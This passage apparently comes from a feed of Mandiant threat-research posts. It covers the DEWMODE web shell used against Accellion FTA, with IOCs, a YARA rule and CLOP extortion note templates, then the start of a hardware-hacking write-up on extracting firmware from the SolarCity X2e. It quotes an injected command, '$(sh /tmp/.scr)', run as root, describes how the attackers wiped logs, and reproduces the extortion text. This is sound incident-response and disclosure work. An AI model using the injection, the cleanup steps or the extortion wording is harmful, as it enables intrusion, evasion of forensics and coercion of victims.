  organization needs assistance reviewing relevant logs, please contact
  Mandiant or Accellion.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/accellion-fta/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: DEWMODE web shell screenshot</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><span class="code">GET
          /courier/about.html?dwn=[REDACTED]&amp;fn=[REDACTED]
          HTTP/1.1&quot; 200 1098240863 &quot;-&quot; &quot;-&quot;
          &quot;-&quot; TLSv1.2 ECDHE-RSA-AES128-SHA256</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: DEWMODE File Download URL parameters</span></p>
 <p>Following file downloads, UNC2546 initiates a cleanup routine by
  passing a specific query parameter named <span
  class="code">csrftoken</span> with the value <span
  class="code">11454bd782bb41db213d415e10a0fb3c</span> to DEWMODE. The
  following actions are performed:</p>
 <ul> <li>A shell script is written to <span
    class="code">/tmp/.scr</span>, which will:<ul> <li>Remove all
        references to <span class="code">about.html</span> from log
        files located in <span class="code">/var/opt/apache/</span></li>
        <li>Write the modified log file to <span
        class="code">/tmp/x</span> then replace the original log file at
          <span class="code">/var/opt/apache/</span></li> <li>Delete the
        contents of the <span
        class="code">/home/seos/log/adminpl.log</span> log file.</li>
        <li>Remove <span
        class="code">/home/seos/courier/about.html</span> (DEWMODE) and
          <span class="code">/home/seos/courier/oauth.api</span> (eval
        web shell), and redirect command output to the file <span
      class="code">/tmp/.out</span></li> <li>Change the permissions of
        the output file to be readable, writeable and executable by all
        users, and set the owner to “nobody”</li> </ul> </li> <li>Delete
    the script file <span class="code">/tmp/.scr</span> and other
    temporarily created files to assist in cleanup</li> <li>Display
    cleanup output to the requesting user</li> </ul>
 <p>An example of a cleanup request and subsequent execution of the
  cleanup script can be seen in Figure 6.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">GET
            /courier/about.html?csrftoken=11454bd782bb41db213d415e10a0fb3c
            HTTP/1.1&quot; 200 5 &quot;-&quot;
            &quot;https://[REDACTED]//courier/about.html?aid=1000&quot;
            &quot;Mozilla/5.0 (X11; Linux x86_64; rv:82.0)
        Gecko/20100101</span></p> <p>
          <span class="code">sft sudo:   nobody : TTY=unknown ;
            PWD=/home/seos/courier ; USER=root ;
            COMMAND=/usr/local/bin/admin.pl --mount_cifs=AF,DF,'$(sh
        /tmp/.scr)',PASSWORD</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: DEWMODE cleanup request</span></p>
 <p>Mandiant also identified a variant of DEWMODE (<span
  class="code">bdfd11b1b092b7c61ce5f02ffc5ad55a</span>) which contained
  minor changes to the cleanup operation, including wiping of <span
  class="code">/var/log/secure</span> and removing <span
  class="code">about.html</span> and <span class="code">oauth.api</span>
  from the directories <span class="code">/home/httpd/html/</span>
  instead of <span class="code">/home/seos/courier/</span>.<b></b></p>
 <p>In a subset of incidents, Mandiant observed UNC2546 requesting a
  file named <span class="code">cache.js.gz</span> (Figure 7). Based on
  temporal file access to the <span class="code">mysqldump</span>
  utility and <span class="code">mysql</span> data directories, the
  archive likely contained a dump of the database. With the exception of
    <span class="code">cache.js.gz</span>, Mandiant has not observed
  UNC2546 acquiring files from Accellion appliances through any method
  besides DEWMODE.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><span class="code">GET
          //courier/cache.js.gz HTTP/1.1&quot; 200 35654360
          &quot;-&quot; &quot;-&quot; &quot;python-requests/2.24.0&quot;
          TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: cache.js.gz file request</span></p>
 <h4>UNC2582 Data Theft Extortion</h4>
 <p>Shortly after installation of the web shell, in multiple cases
  within hours, UNC2546 leveraged DEWMODE to download files from
  compromised FTA instances. While the actors’ motivations were not
  immediately clear, several weeks after delivery of the DEWMODE web
  shell, victims began to receive extortion emails from an actor
  claiming association with the CLOP ransomware team (Figure 8 and
  Figure 9). The actors threatened to publish data on the &quot;CL0P^_-
  LEAKS&quot; .onion shaming website, unless the victim paid an
  extortion fee. We are tracking the subsequent extortion activity under
  a separate threat cluster, UNC2582. Despite tracking the exploitation
  and extortion activity in separate threat clusters we have observed at
  least one case where an actor interacted with a DEWMODE web shell from
  a host that was used to send UNC2582-attributed extortion email.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>Hello!</p> <p>Your network has
          been hacked, a lot of valuable data stolen. &lt;description of
          stolen data, including the total size of the compressed
          files&gt; We are the CLOP ransomware team, you can google news
          and articles about us. We have a website where we publish news
          and stolen files from companies that have refused to
          cooperate. Here is his address http://[redacted].onion/ - use
          TOR browser or http://[redacted].onion.dog/ - mirror. We are
          visited by 20-30 thousand journalists, IT experts, hackers and
          competitors every day. We suggest that you contact us via chat
          within 24 hours to discuss the current situation.
          &lt;victim-specific negotiation URL&gt; - use TOR browser We
          don't want to hurt, our goal is money. We are also ready to
          provide any evidence of the presence of files with us.</p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Extortion Note Template 1</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>This is the last warning!</p>
          <p>If you don’t get in touch today, tomorrow we will create a
          page with screenshots of your files (like the others on our
          site),  send messages to all the emails that we received from
          your files. Due to the fact that journalists and hackers visit
          our site, calls and questions will immediately begin, online
          publications will begin to publish information about the leak,
          you will be asked to comment.</p> <p>Do not let this happen,
          write to us in chat or email and we will discuss the
        situation!</p> <p>CHAT:  &lt;victim-specific negotiation
        URL&gt;</p> <p>EMAIL: unlock@support-box.com</p> <p>USE TOR
        BROWSER!</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Extortion Note Template 2</span></p>
 <p>Based on observations at several engagements, UNC2582 appears to
  follow a pattern of escalation to pressure victims into paying
  extortion demands. Initial emails are sent from a free email account,
  likely unique per victim, to a seemingly limited distribution of
  addresses at the victim organization. If the victim does not respond
  in a timely manner, additional emails are sent to a much larger number
  of recipients from hundreds or thousands of different email accounts
  and using varied SMTP infrastructure. In at least one case, UNC2582
  also sent emails  to partners of the victim organization that included
  links to the stolen data and negotiation chat. Monitoring of the
  CL0P^_- LEAKS shaming website has demonstrated that UNC2582 has
  followed through on threats to publish stolen data as several new
  victims have appeared on the site in recent weeks, including at least
  one organization that has publicly confirmed that their Accellion FTA
  device had been recently targeted.</p>
 <h4>Key Overlaps With FIN11</h4>
 <p>
  <i>UNC2582 (Extortion) and FIN11</i></p>
 <p>Mandiant identified overlaps between UNC2582’s data theft extortion
  activity and prior <a
  href="https://www.fireeye.com/blog/threat-research/2020/10/fin11-email-campaigns-precursor-for-ransomware-data-theft.html">FIN11</a>
  operations, including common email senders and the use of the CL0P^_-
  LEAKS shaming site. While FIN11 is known for deploying CLOP
  ransomware, we have previously observed the group conduct data theft
  extortion without ransomware deployment, similar to these cases.</p>
 <ul> <li>Some UNC2582 extortion emails observed in January 2021 were
    sent from IP addresses and/or email accounts used by FIN11 in
    multiple phishing campaigns between August and December 2020,
    including some of the last campaigns that were clearly attributable
    to the group.</li> <li>We have not observed FIN11 phishing activity
    in the new year. FIN11 has typically paused their phishing
    operations over the winter holidays and had several extended gaps in
    their operations. However, the timing of this current hiatus is also
    consistent with UNC2582’s data theft extortion activity.</li>
    <li>UNC2582 extortion emails contained a link to the CL0P^_- LEAKS
    website and/or a victim specific negotiation page. The linked
    websites were the same ones used to support historical CLOP
    operations, a series of ransomware and data theft extortion
    campaigns we suspect can be exclusively attributed to FIN11.</li> </ul>
 <p>
  <i>UNC2546 (FTA Exploitation and DEWMODE) and FIN11</i></p>
 <p>There are also limited overlaps between FIN11 and UNC2546.</p>
 <ul> <li>Many of the organizations compromised by UNC2546 were
    previously targeted by FIN11.</li> <li>An IP address that
    communicated with a DEWMODE web shell was in the &quot;Fortunix
    Networks L.P.&quot; netblock, a network frequently used by FIN11 to
    host download and FRIENDSPEAK command and control (C2) domains.</li> </ul>
 <h4>Implications</h4>
 <p>The overlaps between FIN11, UNC2546, and UNC2582 are compelling, but
  we continue to track these clusters separately while we evaluate the
  nature of their relationships. One of the specific challenges is that
  the scope of the overlaps with FIN11 is limited to the later stages of
  the attack life cycle. UNC2546 uses a different infection vector and
  foothold, and unlike FIN11, we have not observed the actors expanding
  their presence across impacted networks. We therefore have
  insufficient evidence to attribute the FTA exploitation, DEWMODE, or
  data theft extortion activity to FIN11. Using SQL injection to deploy
  DEWMODE or acquiring access to a DEWMODE shell from a separate threat
  actor would represent a significant shift in FIN11 TTPs, given the
  group has traditionally relied on phishing campaigns as its initial
  infection vector and we have not previously observed them use zero-day
  vulnerabilities.  </p>
 <h4>Acknowledgements</h4>
 <p>David Wong, Brandon Walters, Stephen Eckels and Jon Erickson</p>
 <h4>Indicators of Compromise (IOCs)</h4>
 <p>
  <i>DEWMODE Web Shells</i></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="236" valign="top"><p>
          <b>MD5</b></p> </td> <td width="388" valign="top"><p>
          <b>SHA256</b></p> </td> </tr>
    <tr>
      <td width="236"
        valign="top"><p>2798c0e836b907e8224520e7e6e4bb42</p> </td> <td
        width="388"
        valign="top"><p>5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b</p>
      </td> </tr>
    <tr>
      <td width="236"
        valign="top"><p>bdfd11b1b092b7c61ce5f02ffc5ad55a</p> </td> <td
        width="388"
        valign="top"><p>2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7</p>
      </td> </tr></tbody></table>
 <p>
  <i style="font-size: 12.0px;">UNC2546 Source IP Addresses</i></p>
 <p>The following source IP addresses were observed in multiple UNC2546 intrusions:</p>
 <ul> <li>45.135.229.179</li> <li>79.141.162.82</li>
  <li>155.94.160.40</li> <li>192.154.253.120</li>
  <li>192.52.167.101</li> <li>194.88.104.24</li> </ul>
 <h4>Detections</h4>
 <p>
  <i>FireEye Detections</i></p>
 <ul> <li>FE_Webshell_PHP_DEWMODE_1</li>
  <li>FEC_Webshell_PHP_DEWMODE_1</li> <li>Webshell.PHP.DEWMODE</li> </ul>
 <p>
  <i>Mandiant Security Validation</i></p>
 <ul> <li>A101-515 Malicious File Transfer - DEWMODE Webshell, Upload,
    Variant #1</li> <li>A101-516 Malicious File Transfer - DEWMODE
    Webshell, Upload, Variant #2</li> </ul>
 <p>
  <i>DEWMODE YARA Rule</i></p>
 <p>The following YARA rule is not intended to be used on production
  systems or to inform blocking rules without first being validated
  through an organization's own internal testing processes to ensure
  appropriate performance and limit the risk of false positives. This
  rule is intended to serve as a starting point for hunting efforts to
  identify DEWMODE payloads; however, it may need adjustment over time
  if the malware family changes.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">rule
          DEWMODE_PHP_Webshell<br />  {<br />      strings:<br />       
            $s1 = /if
          \(isset\(\$_REQUEST\[[\x22\x27]dwn[\x22\x27]]\)[\x09\x20]{0,32}&amp;&amp;[\x09\x20]{0,32}isset\(\$_REQUEST\[[\x22\x27]fn[\x22\x27]\]\)\)\s{0,256}\{/<br />
                  $s2 = &quot;&lt;th&gt;file_id&lt;/th&gt;&quot;<br />
                  $s3 = &quot;&lt;th&gt;path&lt;/th&gt;&quot;<br />     
              $s4 = &quot;&lt;th&gt;file_name&lt;/th&gt;&quot;<br />   
                $s5 = &quot;&lt;th&gt;uploaded_by&lt;/th&gt;&quot;<br />
                  $s6 =
          &quot;target=\\\&quot;_blank\\\&quot;&gt;Download&lt;/a&gt;&lt;/td&gt;&quot;<br />
                  $s7 = &quot;Content-Type:
          application/octet-stream&quot;<br />          $s8 =
          &quot;Content-disposition: attachment; filename=&quot;<br />
              condition:<br />          all of them<br />  }</span></td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html2021-02-22T14:00:00.000Z2021-02-22T19:54:03.035ZShining a Light on SolarCity: Practical Exploitation of the X2e IoT
Device (Part One)noemail@noemail.orgJake Valletta<p>In 2019, Mandiant’s Red Team discovered a series of vulnerabilities
  present within Digi International’s <a
    href="http://cms.digi.com/resources/documentation/digidocs/90001537/references/r_connectport_x2e.htm">ConnectPort
  X2e</a> device, which allows for remote code execution as a privileged
  user. Specifically, Mandiant’s research focused on SolarCity’s (now
  owned by Tesla) rebranded ConnectPort X2e device, which is used in
  residential solar installations. Mandiant performs this type of work
  both for research purposes and in a professional capacity for their
  global clients.</p>
 <p>Mandiant collaborated with Digi International and SolarCity/Tesla to
  responsibly disclose the results of the research, resulting in the
  following two CVEs:</p>
 <ul> <li>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-9306">Hardcoded
      Credentials (CVE-2020-9306, CVSS3.0: 8.8)</a></li> <li>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12878">Execution
      with Unnecessary Privileges (CVE-2020-12878, CVSS3.0:
  8.4)</a></li> </ul>
 <p>Technical details can be found in <a
    href="http://ftp1.digi.com/support/firmware/93001304_D.pdf">Digi
    International’s 3.2.30.6 software release</a>, and on FireEye’s
  Vulnerability Disclosures GitHub project (<a
  href="https://github.com/fireeye/Vulnerability-Disclosures/blob/master/FEYE-2020-0019/FEYE-2020-0019.md">FEYE-2020-0019</a>
  and <a href="https://github.com/fireeye/Vulnerability-Disclosures/blob/master/FEYE-2020-0020/FEYE-2020-0020.md">FEYE-2020-0020</a>).</p>
 <p>This two-part blog series will discuss our analysis at a high level,
  explore the novel techniques used to gain initial access to the
  ConnectPort X2e device, and share the technical details of the
  vulnerabilities discovered. Topics to be covered will include physical
  device inspection, debugging interface probing, chip-off techniques,
  firmware analysis, glitch attacks, and software exploitation.</p>
 <p>If you’re interested in continuing the story in <a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-two.html">Part
    Two, you can read it now</a>.</p>
 <h4>FAQ</h4>
 <p>
  <i>What devices are affected, and (potentially) how many devices are affected?</i></p>
 <p>The vulnerabilities described in this post affect ConnectPort X2e
  devices as well as the SolarCity rebranded variant. Other vendor
  devices may also be vulnerable. It is unclear how many ConnectPort X2e
  devices are deployed in the wild.</p>
 <p>
  <i>How is the issue being addressed?</i></p>
 <p>Mandiant worked independently with Digi International and Tesla to
  remediate the vulnerabilities. Mandiant would like to thank Digi
  International and Tesla for their cooperation and dedication to
  improving the security of their products.</p>
 <p>
  <i>How would an attacker exploit these vulnerabilities?</i></p>
 <p>An attacker with local network access (such as being connected to an
  individual’s home network via Ethernet) to a vulnerable X2e device can
  exploit CVE-2020-9306 and CVE-2020-12878 to gain privileged access to
  the device.</p>
 <p>
  <i>Who discovered these vulnerabilities?</i></p>
 <p>Jake Valletta (@jake_valletta), Sam Sabetan (@samsabetan)</p>
 <p>More information such as videos and datasheets on Mandiant’s
  Embedded Device Assessments can be found <a href="https://www.fireeye.com/mandiant/embedded-device-assessment.html">here</a>.</p>
 <h4>Technical Analysis</h4>
 <h5>Device Overview</h5>
 <p>Before diving into the details, we’ll discuss the ConnectPort X2e
  device (referred to as X2e device throughout the post) at a high
  level. The X2e device is a programmable gateway that connects to and
  collects data from ZigBee devices. It is commonly used as a Smart
  Energy gateway to interpret and send energy readings from a
  residential Solar Inverter. Vendors will often purchase an X2e device
  and configure it to read power consumption generated by a customer’s
  Solar Inverter. Figure 1 outlines a typical residential solar
  installation and highlights the X2e’s role.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Typical X2e residential deployment</span></p>
 <p>For our research, we focused on the X2e device used by SolarCity,
  now Tesla, to retrieve data from residential solar installations. A
  typical setup would involve SolarCity providing a customer with a
  gateway that would be connected to the Internet via an Ethernet cable
  on the customer’s home network. Figure 2 shows one of the SolarCity
  branded X2e devices that we tested.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: X2e device</span></p>
 <p>Without even plugging in the X2e device, we know of at least two
  separate interfaces to explore: the Ethernet interface and the ZigBee
  radio. Note that we did not review the ZigBee interface between the
  X2e and a solar invertor, and that interface will not be covered in
  either Part One or Part Two of this series.</p>
 <h4>Initial Analysis and Physical Inspection</h4>
 <h5>Network Reconnaissance</h5>
 <p>We started our research by assessing the X2e device from a network
  perspective. By using <a href="https://nmap.org/"><span
  class="code">nmap</span></a>, we discovered that the device exposed
  both SSH and HTTP/HTTPS, shown in Figure 3.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Port scan results from the X2e</span></p>
 <p>Upon accessing these services remotely, we noted that both services
  required authentication. We also performed limited brute force
  attempts, which were unsuccessful. Additionally, the underlying
  services were not vulnerable to any public exploits. With not many
  network-based leads to follow, we shifted our analysis to a hardware
  perspective to determine if any local attacks may be possible to gain
  initial access onto the device.</p>
 <h5>Physical Board Inspection</h5>
 <p>To begin our hardware analysis, we removed the plastic casing from
  the device and mapped out the various integrated circuit (IC)
  components and searched for potential debugging interfaces.
  Inventorying the components present on the circuit board (also known
  as a PCB) is a crucial step in understanding how the device was
  designed and what can be expected down the road. Figure 4 shows the
  mapped-out components as well as a cluster of pins that resembled a
  typical 3-pin universal asynchronous transmit/receive (UART)
  connection, a common debugging interface on embedded devices.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: X2e components and suspicious
    cluster of pins</span></p>
 <p>Without a remote connection to the X2e device, UART is an attractive
  target. UART typically provides the equivalent functionality of a
  service like SSH or Telnet and the added benefit of watching verbose
  output during system boot. To determine if the cluster of pins was a
  UART interface, we first soldered a 3-pin through-hole header to the
  PCB. Using a combination of continuity tests with a multimeter and the
  digital logic analyzer <a
  href="https://www.saleae.com/downloads/">Saleae</a>, it became
  apparent that we were in fact dealing with a UART interface. The
  Figure 5 shows the three pins (Ground, TX, RX) connected to the
  header. Attached to the other end of the three wires was a <a
    href="https://www.ftdichip.com/Products/Cables/USBTTLSerial.htm">FTDI
    serial TTL-232 to USB adapter</a>, which was connected to a Linux
  virtual machine.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Connecting to potential UART interface</span></p>
 <p>In addition to correctly identifying the UART pins and a UART to USB
  adapter, we also needed software to read/write from the interface as
  well as knowledge of the baud rate. Baud rates vary but typically
  follow standard values, including 9600, 14400, 19200, 38400, 57600,
  and 115200. Using the python module <a
      href="https://pypi.org/project/pyserial/"><span
  class="code">pySerial</span></a>, we connected to the USB adapter and
  tried standard baud rates until one of the rates produced readable
  ASCII output (an incorrect baud rate will typically produce
  non-readable output), and determined the X2e used a baud rate of 115200.</p>
 <p>Upon booting the X2e, we noted output from the BootROM, bootloader
  (which was Das U-Boot 2009.8, a common embedded bootloader), as well
  as output from the Linux kernel transmitted over the UART connection,
  shown in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: UART boot messages</span></p>
 <p>Many configurations of U-Boot allow a physically connected user
  (using an interface such as UART) the ability to interrupt the boot
  process; however, this configuration explicitly disabled that feature,
  shown in Figure 7.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Uninterruptable U-Boot
    bootloader on the X2e</span></p>
 <p>Interrupting a bootloader is attractive to an attacker, as often the
  boot parameters passed to the Linux operating system can be
  manipulated to control how it will load, such as booting into single
  user mode (typically a recover shell) or mounting filesystems as
  read-write. In the case of the X2e, the UART connection was mapped to
  a Linux TTY which required username and password authentication, shown
  in Figure 8.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: User authentication to Linux
    over UART</span></p>
 <p>Without any ability to interrupt the boot process or credentials to
  authenticate to the X2e, we were faced with another dead end. We then
  shifted our analysis to obtaining the firmware stored on the X2e’s
  non-volatile storage.</p>
 <h5>Chip Removal and Data Extraction</h5>
 <p>In this section, we’ll cover the basics of non-volatile memory,
  often referred to as “flash memory”, present on embedded devices as
  well as the process used to extract content from the chip. As
  mentioned, taking inventory of the components on the PCB is an
  important first step. Figure 9 shows the suspected flash chip present
  on the PCB magnified under a digital microscope.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Closeup of Spansion flash</span></p>
 <p>The visible markings seen in Figure 9 are important as they allow us
  to determine the manufacturer and model of the flash, which will
  assist us with obtaining the datasheet for the chip. In our case, the
  NAND we were dealing with was a Spansion S34ML01G1, and its datasheet
  could be found <a href="https://datasheetspdf.com/datasheet/S34ML01G1.html">here</a>.</p>
 <h5>NAND Overview</h5>
 <p>Before we talk about acquiring the firmware from the NAND chip, it’s
  important to first understand the various scenarios that embedded
  devices typically follow.</p>
 <p>
  <b>NAND verses NOR</b>: These fundamentally different technologies
  each have their own benefits and drawbacks. NAND is cheap but suffers
  from high probability of “bad blocks,” or areas that are corrupt
  sometimes directly from the factory. As such, protections and
  considerations need to be present to be able to protect against this.
  NAND is also much faster to erase and write, making it ideal for
  storing file systems, kernels, and other pieces of code that may need
  to be reset or changed. NOR has significantly faster read times but is
  not as flexible with accessing data and has low erase and write
  speeds. NOR is usually used for low-level bootloaders, hardcoded
  firmware blobs, and other areas that are not expected to change
  frequently. <b>The X2e uses a</b> <b>NAND flash.</b></p>
 <p>
  <b>Serial verses Parallel</b>: This refers to how the data is accessed
  and is typically visually identifiable. If there are a large number of
  pins, the flash is likely parallel. Serial NOR chips can be small in
  size and typically need eight or fewer pins to function. Common serial
  interfaces are Serial Peripheral Interface (SPI) or Inter-Integrated
  Circuit (I2C), while a common parallel interface for NAND is Open NAND
  Flash Interface (ONFI2.0, ONFI3.0). <b>The X2e is a</b> <b>parallel flash.</b></p>
 <p>
  <b>IC Form Factor</b>: Another visually identifiable trait—form factor
  (or “package”)—refers to how the chip is attached to the PCB. There is
  a long list of options <a
  href="https://en.wikipedia.org/wiki/List_of_integrated_circuit_packaging_types">here</a>,
  but common surface-mount flash packages include small outline package
  (SOP), thin outline small package (TOSP), or a variant of ball grid
  array (*BGA). The key distinction here is SOP and TOSP expose the
  pins, while BGA conceals the pins under the package. <b>The X2e is</b>
    <b>BGA63, also referred to as a 63-pin BGA package.</b></p>
 <p>
  <b>Managed verses Unmanaged Flash</b>: This one is more applicable to
  NAND, for reasons alluded to in the NAND verses NOR section. As
  stated, NAND needs help to manage the integrity of the data. With
  unmanaged NAND, the IC reserves sections of the flash (often called
  “spare” area) for <i>someone</i> else to manage the data. This is
  typically implemented as either a kernel driver or an external NAND
  controller. Managed NAND means that the IC package includes the
  controller and transparently manages the data. This is extremely
  common in embedded devices, as either embedded MMC (eMMC) or universal
  flash storage (UFS). <b>The X2e uses</b> <b>unmanaged flash and is
    controlled by the main microcontroller present on the PCB.</b></p>
 <p>With the basics out of the way, we proceeded with physically
  removing the chip from the PCB.</p>
 <h5>Chip Removal</h5>
 <p>Physical chip removal is considered a destructive approach but can
  certainly be performed without damaging the PCB or the flash chip
  itself. When presented with removal of BGA packages, the two most
  common removal techniques are either hot air or infrared light (IR).
  Commercial solutions exist for both hot air and IR, but cheaper
  options exist with hot air removal. We opted to use hot air on the X2e.</p>
 <p>To minimize damage to the PCB and flash, a PCB heater or oven can be
  used to slowly bring the entire PCB to a temperature right below the
  solder melting point. This will reduce the amount of time we need to
  focus our hot air directly onto the flash IC and help with reducing
  the heat dissipation into the PCB throughout the process.</p>
 <p>One final trick that can be used to minimize nearby chips from being
  damaged or lost (due to the air pressure) is the use of high-heat
  resistant tape, commonly referred to as Kapton tape. Figure 10 shows
  the PCB wrapped in Kapton tape to protect nearby components.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: High-heat resistant tape on PCB</span></p>
 <p>Figure 11 shows an example setup with the X2e PCB inserted into a
  PCB heater, with a hot air gun suspended over the IC.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: Hot air rework/reflow station</span></p>
 <p>While using the hot air to warm the IC and surrounding areas, we
  gently nudged the flash to see if the solder had become molten. Once
  the chip appeared to be floating, we quickly removed the chip and let
  it cool for about 30 seconds. Figure 12 shows the IC flash removed
  from the PCB, with the solder still present on the BGA pads.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig12.jpg" alt="" />
  <br /> <span class="type-XS">Figure 12: NAND removed from X2e</span></p>
 <p>Before inserting the NAND into a clam-shell chip reader, the
  leftover solder must be removed from the flash. This can be
  accomplished using a soldering iron, high-quality flux, and
  de-soldering wick. Once removed, isopropyl alcohol and a toothbrush
  are highly effective at removing the leftover flux residue and
  cleaning the chip.</p>
 <p>In the next section, we’ll attempt to extract the data from the NAND
  chip using a multi-purpose chip programmer.</p>
 <h5>Data Extraction</h5>
 <p>With the cleaned flash chip in hand, we can now explore options for
  reading the raw contents. Commercial forensic acquisition devices
  exist, but a quick eBay or AliExpress search will produce a multitude
  of generic chip readers. One such device, the <a
    href="http://www.xgecu.com/en/">XGecu Pro</a>, supports a variety of
  adapters and chipsets and connects to a Windows machine using USB. It
  also comes with software to interface with the XGecu Pro and can even
  auto-detect flash. To connect the Spansion NAND to the XGecu Pro, we
  also purchased a clamshell BGA63 adapter. Figure 13 shows the NAND
  inserted into the clamshell reader, and Figure 14 shows the clamshell
  adapter connected to the XGecu Pro device.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig13.jpg" alt="" />
  <br /> <span class="type-XS">Figure 13: Spansion NAND in BGA clamshell adapter</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: NAND adapter connected to XGecu</span></p>
 <p>Using the XGecu Pro software, we can read the entire contents of the
  flash to a binary file for further analysis. Since these are not
  commercial solutions, it is a good idea to perform two or three reads
  and then diff the extraction to confirm the content was read without errors.</p>
 <h4>Firmware Analysis</h4>
 <h5>Cleaning and Mounting</h5>
 <p>With our fresh NAND dump in hand, the next step was to parse out any
  relevant firmware blobs, configurations, or filesystems. The go-to
  tool for starting this process is <a
      href="https://github.com/ReFirmLabs/binwalk"><span
  class="code">binwalk</span></a>. <span class="code">binwalk</span>
  does a fantastic job of detecting filesystems, bootloaders, and
  kernels. In addition, <span class="code">binwalk</span> can calculate
  entropy (detecting packed or encrypted data) and identify assembly
  opcodes. Figure 15 shows partial output of running <span
  class="code">binwalk</span> against the NAND dump.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig15.png" alt="" />
  <br /> <span class="type-XS">Figure 15: Initial binwalk scan against
    NAND dump</span></p>
 <p>We can see from the output that <span class="code">binwalk</span>
  successfully identified what it believes are U-Boot uImage headers,
  Linux kernel images, and more than a dozen Journaling Flash File
  System version 2 (JFFS2) filesystems. JFFS2 is a common filesystem
  used in embedded devices; Unsorted Block Image File System (UBIFS) and
  SquashFS would also be common.</p>
 <p>At first glance, the output appears to be promising; however, it is
  highly unlikely that there are actually that many JFFS2 filesystems
  present on our NAND. Another indication that something isn’t quite
  right are the hexadecimal offsets – they don’t appear to be clean,
  uniform offsets. It is far more common that the offsets of the items
  identified by <span class="code">binwalk</span> would align with NAND
  page offsets, which are a multiple of 2048.</p>
 <p>In order to understand what is occurring here, we need to revisit a
  characteristic of unmanaged (or “raw”) NAND ICs described in the NAND
  Overview section. To recap, raw NAND requires additional bytes per
  page for use by higher-level components to attest to the validity of
  the page, typically implemented as a defined “bad block” marker and a
  per-page (or subpage) Error-Correcting Code (ECC). Without going too
  deep into ECC fundamentals, ECC provides the ability for higher-level
  processes to detect <i>n</i> number of bad bits on a page and to
  correct <i>m</i> number of bits.</p>
 <p>Since our goal here is not to perform forensics on the raw NAND, our
  immediate objective is to remove any ECC bytes or other non-data
  related bytes from the NAND dump. The MCU is ultimately the system
  manipulating the raw NAND, so understanding how our MCU, which was an
  NXP iMX28 series MCU, manages NAND is critical to being able to
  perform this.</p>
 <p>Fortunately for us, this process has already been explored by the <a
    href="http://conference.hitb.org/files/hitbsecconf2019ams/materials/D1T3%20-%20How%20to%20Dump,%20Parse,%20and%20Analyze%20i.MX%20Flash%20Memory%20Chips%20-%20Damien%20Cauquil.pdf">security
  community</a>, and <a
    href="https://github.com/DigitalSecurity/imx-nand-tools">iMX parsing
    libraries exist</a> to manipulate the raw NAND dump and remove
  existing extraneous data. Figure 16 shows the results of re-running
    <span class="code">binwalk</span> on the output of the <span
  class="code">imx-nand-convert</span> script.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig16.png" alt="" />
